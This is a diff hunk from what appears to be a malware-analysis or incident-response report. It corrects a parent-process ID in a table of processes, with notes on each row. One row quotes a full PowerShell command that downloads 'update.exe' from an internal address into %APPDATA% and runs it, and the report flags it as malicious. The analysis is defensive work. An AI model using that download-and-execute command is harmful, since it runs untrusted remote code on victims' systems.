@@ -79,7 +79,7 @@
 | chrome.exe | 2488 | 3604 | Standard launch | Benign (initiated the download) |
 | MicrosoftEdgeUpdate.exe | 228 | 1476 | `/ua /installsource scheduler` | Benign (standard Edge update) |
 | powershell.exe | 3140 | 3604 | `-Command "iex '$u=\"http://10.14.97.[REDACTED]/update.exe\";$p=\"$env:APPDATA/update.exe\";Invoke-WebRequest $u -OutFile $p;Start-Process $p'"` | **Malicious.** Downloads and executes a remote binary. Uses `iex`, a common obfuscation and execution technique. |
-| update.exe | 4340 | powershell.exe | `C:\Users\Administrator\AppData\Roaming\update.exe` | **Malicious.** Unsigned payload in a user-writable path with a generic name; contacts a suspicious domain. |
+| update.exe | 4340 | 3140 | `C:\Users\Administrator\AppData\Roaming\update.exe` | **Malicious.** Unsigned payload in a user-writable path with a generic name; contacts a suspicious domain. |
 
 **Analyst Note:** The PowerShell command is not obfuscated, but the `iex` (Invoke-Expression) wrapper is unnecessary for a simple download and is a common pattern in malicious scripts. The `$p` variable also places the file in `%APPDATA%`, which is a common persistence and staging location.
 
